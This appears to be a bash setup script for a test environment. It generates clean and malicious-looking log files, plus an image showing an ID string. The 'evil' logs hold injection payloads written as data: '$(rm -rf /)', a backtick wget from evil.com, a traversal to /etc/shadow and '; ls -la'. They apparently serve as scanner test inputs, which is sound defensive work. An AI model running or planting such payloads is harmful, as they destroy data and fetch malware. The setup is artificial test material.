#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip python3-venv tesseract-ocr
    pip3 install pytest Pillow

    mkdir -p /app/corpus/clean /app/corpus/evil

    python3 -c "
import os
from PIL import Image, ImageDraw

# Generate clean files
for i in range(50):
    with open(f'/app/corpus/clean/log_{i}.txt', 'w') as f:
        f.write(f'[INFO] Scan completed successfully. Items: {i}\n')

# Generate evil files
evil_payloads = [
    '[ERROR] Scan failed. File: ../../../etc/shadow',
    '[INFO] User input: $(rm -rf /)',
    '[DEBUG] Payload: \`wget http://evil.com/malware\`',
    '[WARNING] Invalid char: \x00\x00\x00',
    '[INFO] Executing: ; ls -la'
]
for i in range(50):
    with open(f'/app/corpus/evil/log_{i}.txt', 'w') as f:
        f.write(evil_payloads[i % len(evil_payloads)] + '\n')

# Generate image
img = Image.new('RGB', (200, 50), color = (255, 255, 255))
d = ImageDraw.Draw(img)
d.text((10,10), 'QA-ENV-ID-8842', fill=(0,0,0))
img.save('/app/system_blueprint.png')
"

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
